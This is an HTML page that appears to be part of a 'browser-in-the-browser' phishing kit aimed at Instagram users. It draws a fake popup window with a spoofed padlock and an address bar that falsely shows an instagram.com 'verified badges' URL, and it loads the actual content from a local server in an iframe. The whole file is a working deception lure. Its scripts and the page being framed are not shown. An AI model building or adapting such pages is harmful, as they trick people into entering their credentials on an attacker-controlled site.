<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>


<body>

<div id="window">
<!-- Title bar stsart -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./logo.jpeg" width="20px" height="15px" id="logo">
			<span id="logo-description">verified Badges | Instagram Help Center</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://www.instagram.com/accounts/verifiedBadges</span>
		<span id="domain-path"></span>
	</div>

</div>
<iframe id="content" src="http://localhost/instagram/" frameBorder="0"></iframe>
</div>

</body>
<script src="script.js"></script>
</html>
